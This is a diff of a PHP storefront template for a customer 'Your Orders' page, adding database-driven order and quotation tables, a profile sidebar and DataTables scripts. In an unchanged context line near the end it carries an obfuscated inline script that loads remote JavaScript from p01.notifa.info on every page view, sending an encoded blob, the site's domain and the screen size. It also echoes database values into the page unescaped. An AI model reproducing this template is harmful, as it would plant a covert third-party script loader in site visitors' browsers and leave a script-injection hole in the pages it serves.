@@ -11,12 +11,14 @@
                 <meta name="author" content="BDTASK">
         <meta name="description" content="">
 
-        <title>customer</title>
+        <title>Klak Klik : Customer Your Order </title>
    
         <!-- Favicons --> 
         <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
         
         <!-- Bootstrap core CSS -->
+    <link href="<?php echo base_url();?>assets/dist/css/style.min.css" rel="stylesheet">
+
         <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
         <!-- Bootstrap core CSS -->
         <link href="<?php echo base_url().'assets/website/vendor/bootstrap/css/bootstrap.min.css'?>" rel="stylesheet">  
@@ -55,6 +57,7 @@
 
         <!-- jquery-ui.min.js -->
         <script src="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.js'?>" type="text/javascript"></script>
+        
         
         <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
         <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
@@ -155,15 +158,155 @@
                 border-color: #22df00; 
                 
             }
+
+            .hilang{
+                display: none;
+            }
             
             
         </style>
+        <style type="text/css">
+                            .checkout-address-inner {
+                                padding-bottom: 16px;
+                            }
+
+                            .address-hat {
+                                    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;
+                            }
+                            .address-title-container {
+                                position: relative;
+                                margin-bottom: 8px;
+                            }
+
+                            .address-title-container .address-title {
+                                font-size: 14px;
+                                line-height: 16px;
+                                color: #757575;
+                            }
+                            .address-edit {
+                                position: absolute;
+                                top: 0;
+                                right: 0;
+                                font-size: 14px;
+                                color: #0cb5ba;
+                                cursor: pointer;
+                            }
+                             .address-name {
+                                font-size: 14px;
+                                line-height: 16px;
+                                word-wrap: break-word;
+                                margin-bottom: 8px;
+                                color: #212121;
+                            }
+                            .address-info-item {
+                                font-size: 14px;
+                                line-height: 16px;
+                                word-wrap: break-word;
+                                color: #757575;
+                            }
+                            
+                            .list-group-item-action {
+                              width: 100%;
+                              color: #4F5467;
+                              text-align: inherit; }
+                              .list-group-item:hover, .list-group-item:focus {
+                                    z-index: 1;
+                                    color: #fff;
+                                    background: #000;
+                                    text-decoration: none; }
+                              .list-group-item-action:active {
+                                color: #212529;
+                                background-color: #e9ecef; }
+
+                            .list-group-item {
+                                color: #000;
+                                        border-radius: 0px;
+                                        position: relative;
+                                        display: block;
+                                        padding: 0.75rem 1.25rem;
+                                        margin-bottom: -1px;
+                                        background-color: #fff;
+                                        border-left: 0px;
+                                        border-right: 0px; }
+                              .list-group-item:first-child {
+                                }
+                              .list-group-item:last-child {
+                                margin-bottom: 0;
+                               }
+                              .list-group-item:hover, .list-group-item:focus {
+                                z-index: 1;
+                                text-decoration: none; }
+                              .list-group-item.disabled, .list-group-item:disabled {
+                                color: #6c757d;
+                                background-color: #fff; }
+                                .list-group-item.active {
+                                    border-radius: 0px;
+                                z-index: 2;
+                                color: #fff;
+                                background-color: #22df00;
+                                border-color: #22df00;
+                            }
+                              
+                        </style>
+                        <style type="text/css">
+                            .head-cart{
+                                    background-color: #fafafa;
+                                    text-align: left;
+                                    font-size: 12px;
+                                    line-height: 14px;
+                                    color: #757575;
+                                    text-align: center;
+                            }
+
+                            .img-wrap{
+                                    position: relative;
+                                    float: left;
+                                    width: 80px;
+                                    height: 80px;
+                                    margin-right: 12px;
+                            }
+                            .content{
+                                display: inline-block;
+                                /*width: 346px;*/
+                            }
+
+                            .cart-item-middle {
+                                display: table-cell;
+                                vertical-align: top;
+                                width: 156px;
+                                padding-left: 9px;
+                            }
+                            .cart-item-middle .current-price {
+                                font-size: 18px;
+                                line-height: 28px;
+                                color: #f57224;
+                                font-weight: 500;
+                                margin-bottom: 4px;
+                            }
+                            .cart-item-middle .origin-price {
+                                font-size: 14px;
+                                line-height: 16px;
+                                color: #757575;
+                                margin-bottom: 8px;
+                                text-decoration: line-through;
+                            }
+                            .cart-item-middle .promotion-ratio {
+                                font-size: 14px;
+                                line-height: 16px;
+                                color: #212121;
+                                font-weight: 500;
+                            }
+                            .action{
+                                    font-size: 24px;
+                                    color: #000;
+                            }
+                        </style>
 
      
     
     </head>
 
-    <body>
+    <body style="background: #f4f4f4;">
         <!--==== Preloader =======-->
         <div class="preloader"></div>
 
@@ -243,81 +386,289 @@
 
 
 <!-- Content  -->
-     <center><h1 class="m-5" style="font-size: 4.05rem;">YOUR ORDERS</h1></center>
-   
-        <div class="container-fluid">
-        <div class="row">
-            <div class="col-md-8 m10" style=" margin:10px;">
-                <div class="container">
-                          <h4>Your orders in one place.
+   <div class="container">
+    <div class="row">
+        <div class="col-lg-9 col-12">
+            <div class="row">
+                    <div class="col-lg-12 col-12 content-inner" id='your-order'>
+                        <div style="margin-top: 12px;background:#fff;padding: 40px;">
+                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Pesanan Anda</div>
 
-                            </h4>
+                        
+                        <div class="table-responsive">
+                            <table id="" class="table example">
+                                <thead>
+                                    <tr>
+                                        <th class="head-cart">No Order</th>
+                                        <th class="head-cart">Status Order</th>
+                                        <th class="head-cart">Tanggal Order</th>
+                                        <th class="head-cart">Total</th>
+                                        <th class="head-cart"></th>
+
+                                    </tr>
+                                </thead>
+                                <tbody id="">
+                                    <?php $no=1; foreach ($data_order as $order_data): ?>
+                                        <tr>
+                                            <td><?php echo $order_data->no_order ?></td>
+                                              <td>
+                                                <?php 
+                                                if($order_data->status_order == 0){
+                                                    echo "<span class='label label-inverse'>Waiting Payment</span>";
+                                                }elseif($order_data->status_order == 1){
+                                                    echo "<span class='label label-primary'>On Process</span>";
+                                                }elseif($order_data->status_order == 2){
+                                                    echo "<span class='label label-info'>On Delivery</span>";
+                                                }elseif($order_data->status_order == 3){
+                                                    echo "<span class='label label-success'>Success</span>";
+                                                }elseif($order_data->status_order == 4){
+                                                    echo "<span class='label label-danger'>Cancel</span>";
+
+                                                }else{
+                                                     echo "<span class='label label-warning'>Pending</span>";
+
+                                                }
+
+                                                ?>
+                                            </td>
+                                            <td><?php echo $order_data->tanggal_order ?></td>
+                                            <td><?php echo 'Rp'.number_format($order_data->total_bayar) ?></td>
+                                            <td><a href="">Detail</a></td>
+
+                                        </tr>
+                                        
+                                    <?php endforeach ?>
+
+
+
+
+                                 
+
                                     
-                          <table class="table table-hover table-striped center">
-                            <thead class="thead-dark">
-                              <tr>
-                                <th>ORDER #</th>
-                                <th>Date</th>
-                                <th>Total</th>
-                                <th>Status</th>
-                                <th>Action</th>
-                              </tr>
-                            </thead>
-                            <tbody>
-                              <tr >
-                                <td># 1735</td>
-                                <td>June</td>
-                                <td>Rp.150.000</td>
-                                <td><div class="bg_blue radius p-2">Dikirim</div></td>
-                                <td><a href="<?php echo base_url().'customer/order_detail'?>"><button class="btn btn-default">View</button></a></td>
-                              </tr>
-                              <tr>
-                                <td># 1135</td>
-                                <td>July</td>
-                                <td>Rp.250.000</td>
-                                  <td><div class="bg_green radius p-2">Diterima</div></td>
-                                <td><a href="<?php echo base_url().'customer/order_detail'?>"><button class="btn btn-default">View</button></a></td>
-                              </tr>
-                              <tr>
-                                <td># 1433</td>
-                                <td>April</td>
-                                <td>Rp.390.000</td>
-                                  <td><div class="bg_red radius p-2">Dibatalkan</div></td>
-                                <td><a href="<?php echo base_url().'customer/order_detail'?>"><button class="btn btn-default">View</button></a></td>
-                              </tr>
-                            </tbody>
-                          </table>
-                  </div>
+                                </tbody>
+                                
+                            </table>
+                            
+                        </div>
+                   
+                        
+                        </div>
+                            
+                    </div>
+
+                    <div class="col-lg-12 col-12 hilang content-inner" id="your-quotation">
+                        <div style="margin-top: 12px;background:#fff;padding: 40px;">
+                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Penawaran Anda</div>
+
+                        
+                        <div class="table-responsive">
+                            <table id="" class="table example">
+                                <thead>
+                                    <tr>
+                                        <th class="head-cart">No Order</th>
+                                        <th class="head-cart">Status Order</th>
+                                        <th class="head-cart">Tanggal Order</th>
+                                        <th class="head-cart">Total</th>
+                                        <th class="head-cart"></th>
+
+                                    </tr>
+                                </thead>
+                                <tbody id="">
+                                    <?php $no=1; foreach ($data_quotation as $quotation_data): ?>
+                                        <tr>
+                                            <td><?php echo $quotation_data->no_order ?></td>
+                                              <td>
+                                                <?php 
+                                                if($quotation_data->status_order == 0){
+                                                    echo "<span class='label label-inverse'>Request For Quotation</span>";
+                                                }elseif($quotation_data->status_order == 1){
+                                                    echo "<span class='label label-success'>Convert to Invoice</span>";
+                                                }elseif($quotation_data->status_order == 2){
+                                                    echo "<span class='label label-info'>On Delivery</span>";
+                                                }elseif($quotation_data->status_order == 3){
+                                                    echo "<span class='label label-success'>Success</span>";
+                                                }elseif($quotation_data->status_order == 4){
+                                                    echo "<span class='label label-danger'>Cancel</span>";
+
+                                                }else{
+                                                     echo "<span class='label label-warning'>Pending</span>";
+
+                                                }
+
+                                                ?>
+                                            </td>
+                                            <td><?php echo $quotation_data->tanggal_order ?></td>
+                                            <td><?php echo 'Rp'.number_format($quotation_data->total_bayar) ?></td>
+                                            <td><a href="">Detail</a></td>
+
+                                        </tr>
+                                        
+                                    <?php endforeach ?>
+
+
+
+
+                                 
+
+                                    
+                                </tbody>
+                                
+                            </table>
+                            
+                        </div>
+                   
+                        
+                        </div>
+                            
+                    </div>
+
+                    <div class="col-lg-12 col-12 hilang content-inner" id="your-profile">
+                        <div style="margin-top: 12px;background:#fff;padding: 40px;">
+                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Profil</div>
+
+                        
+                       
+                   
+                        
+                        </div>
+                            
+                    </div>
+
+                    <div class="col-lg-12 col-12 hilang content-inner" id="your-address">
+                        <div style="margin-top: 12px;background:#fff;padding: 40px;">
+                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Alamat</div>
+
+                        
+                       
+                   
+                        
+                        </div>
+                            
+                    </div>
+
+                    <div class="col-lg-12 col-12 hilang content-inner" id="change-password">
+                        <div style="margin-top: 12px;background:#fff;padding: 40px;">
+                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Ganti Password</div>
+
+                        
+                       
+                   
+                        
+                        </div>
+                            
+                    </div>
+
+
+
+                        
+            </div>
+
+
+            <script type="text/javascript">
+
                 
-            </div>
-            <div class="col-md-3" style=" margin:10px; background:#f8f9fa; padding:10px; min-height:500px;">
-            <div class="col-md-12 center" >
-                <img src="http://demo.solwininfotech.com/wordpress/veriyas-pro/wp-content/uploads/2016/05/John-Doe.jpg" class="img-thumbnail" style="max-height:200px;" >
-               <p><b>John Doe</b></p>
-               <p>Bekasi,Indonesia</p>
-                </div> 
-                <div class="col-md-12 center">
-                <ul class="list-group ">
-                    
-                      <li class="list-group-item d-flex justify-content-between align-items-center list-group-item-action"> Order
-                            <span class="badge badge-primary badge-pill">3</span>
-                      </li>
-                    
-                      <li class="list-group-item d-flex justify-content-between align-items-center list-group-item-action"> Profile
-                           <!-- <span class="badge badge-primary badge-pill">12</span>-->
-                      </li>
-                    
-                    <li class="list-group-item d-flex justify-content-between align-items-center list-group-item-action">logout</li>
-                           
-                     
-                    </ul>
-                </div>
+            </script>
+
             
-            
-            </div>
-        
         </div>
+        <div class="col-lg-3">
+            <div style="margin-top: 12px;background:#fff;position: sticky;top: 80px;">
+                <div class="col-lg-12">
+                    <div style="text-align:  center;padding: 20px;font-size: 20px;color: #212121;margin-bottom: 14px;margin-top: 14;position: relative;font-weight: 500;padding-bottom: 0px;font-weight: 500;">
+                        <?php echo $data_customer[0]->nama; ?>
+                    </div>
+
+                    <div style="text-align: center;padding: 20px;padding-top: 0px;">
+                        <img src="<?php echo base_url(); ?>my-assets/image/customers/<?php echo $data_customer[0]->photo; ?>" alt="<?php echo $data_customer[0]->photo; ?>" class="img-circle" width="150" >
+                    </div>
+                    <div>
+                          
+                                                                        
+                                   
+                                    <div class="address-name" id="perusahaan"><center><?php echo $data_customer[0]->perusahaan; ?></center></div>
+
+                                    <div class="address-name"><center></center></div>
+                                    <div class="address-info-item address-value" id="alamat"><?php echo $data_customer[0]->perusahaan; ?></div>
+
+                                    <div class="address-info-item address-value" id="provinsi_kota"><?php echo $data_customer[0]->provinsi.','.$data_customer[0]->kota.','.$data_customer[0]->kecamatan_kelurahan.','.$data_customer[0]->kode_pos; ?></div>
+                                    <!-- <div class="address-info-item address-value" id="no_telp">0888999123</div> -->
+
+                                    <div class="address-title-container">
+                                       
+                                    </div>
+
+
+                            
+                            
+                    </div>
+                </div>
+                <div class="list-group"> 
+
+                    <a href="javascript:void(0)" class="list-group-item your-order active">Pesanan Saya</a> 
+                    <a href="javascript:void(0)" class="list-group-item your-quotation">Penawaran Saya</a> 
+                    <a href="javascript:void(0)" class="list-group-item your-profile">Profil</a> 
+                    <a href="javascript:void(0)" class="list-group-item your-address">Alamat</a> 
+                    <a href="javascript:void(0)" class="list-group-item change-password">Ganti Password</a> 
+
+                    <a href="javascript:void(0)" class="list-group-item">Logout</a> 
+                </div>
+
+                <script type="text/javascript">
+                    $('.your-order').on('click',function(){
+                        $('#your-order').removeClass('hilang');
+                        $('#your-quotation').addClass('hilang');
+                        $( '#your-profile' ).addClass('hilang');
+                        $( '#your-address').addClass('hilang');
+                        $(  '#change-password').addClass('hilang');
+                    });
+
+                    $('.your-quotation').on('click',function(){
+                        $('#your-quotation').removeClass('hilang');
+                        $('#your-order').addClass('hilang');
+                        $('#your-profile').addClass('hilang');
+                        $('#your-address').addClass('hilang');
+                        $(' #change-password').addClass('hilang');
+
+                    });
+
+                    $('.your-profile').on('click',function(){
+                        $('#your-profile').removeClass('hilang');
+                        $('#your-order ').addClass('hilang');
+                        $('#your-quotation ').addClass('hilang');
+                        $('#your-address ').addClass('hilang');
+                        $('#change-password ').addClass('hilang');
+
+                    });
+
+                    $('.your-address').on('click',function(){
+                        $('#your-address').removeClass('hilang');
+                        $('#your-order').addClass('hilang');
+                        $(' #your-profile').addClass('hilang');
+                        $(' #your-quotation').addClass('hilang');
+                        $('#change-password').addClass('hilang');
+
+                    });
+
+                    $('.change-password').on('click',function(){
+                        $('#change-password').removeClass('hilang');
+                        $('#your-order ').addClass('hilang');
+                        $('#your-profile').addClass('hilang');
+                        $('#your-address').addClass('hilang');
+                        $('#your-quotation').addClass('hilang');
+
+                    });
+
+                    
+                </script>
+
+                
+            
+            </div>
     </div>
+       
+   </div>
+    </div>
+
   
         
         
@@ -508,40 +859,64 @@
                 });
             }
         </script>
+         <!-- This is data table -->
+        <script src="<?php echo base_url();?>assets/node_modules/datatables/jquery.dataTables.min.js"></script>
+         <script>
+    $(document).ready(function() {
+        $('#myTable').DataTable();
+        $(document).ready(function() {
+            var table = $('.example').DataTable({
+                // "columnDefs": [{
+                //     "visible": false,
+                //     "targets": 2
+                // }],
+
+                "order": [
+                    [0, 'desc']
+                ],
+                "displayLength": 25,
+                "drawCallback": function(settings) {
+                    // var api = this.api();
+                    // var rows = api.rows({
+                    //     page: 'current'
+                    // }).nodes();
+                    // var last = null;
+                    // api.column(2, {
+                    //     page: 'current'
+                    // }).data().each(function(group, i) {
+                    //     if (last !== group) {
+                    //         $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
+                    //         last = group;
+                    //     }
+                    // });
+                }
+            });
+            // Order by the grouping
+            // $('#example tbody').on('click', 'tr.group', function() {
+            //     var currentOrder = table.order()[0];
+            //     if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
+            //         table.order([2, 'desc']).draw();
+            //     } else {
+            //         table.order([2, 'asc']).draw();
+            //     }
+            // });
+        });
+    });
+    $('#myTable').DataTable({
+        dom: 'Bfrtip',
+        buttons: [
+            'copy', 'csv', 'excel', 'pdf', 'print'
+        ]
+    });
+    </script>
     <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
     
-    
-        <!--timer-->
-        
-<script>
-// Set the date we're counting down to
-var countDownDate = new Date("Aug 24, 2018 15:37:25").getTime();
-
-// Update the count down every 1 second
-var x = setInterval(function() {
-
-    // Get todays date and time
-    var now = new Date().getTime();
-    
-    // Find the distance between now and the count down date
-    var distance = countDownDate - now;
-    
-    // Time calculations for days, hours, minutes and seconds
-    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
-    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
-    
-    // Output the result in an element with id="demo"
-    document.getElementById("demo").innerHTML = days + "d " + hours + "h "
-    + minutes + "m " + seconds + "s ";
-    
-    // If the count down is over, write some text 
-    if (distance < 0) {
-        clearInterval(x);
-        document.getElementById("demo").innerHTML = "EXPIRED";
-    }
-}, 1000);
+<script type="text/javascript">
+    $('.list-group-item').on('click',function(){
+        // $(this).addClass('active');
+         $(this).addClass('active').siblings().removeClass('active');
+        // $('.list-group-item').removeClass('active');
+    });
 </script>
         
         <script>
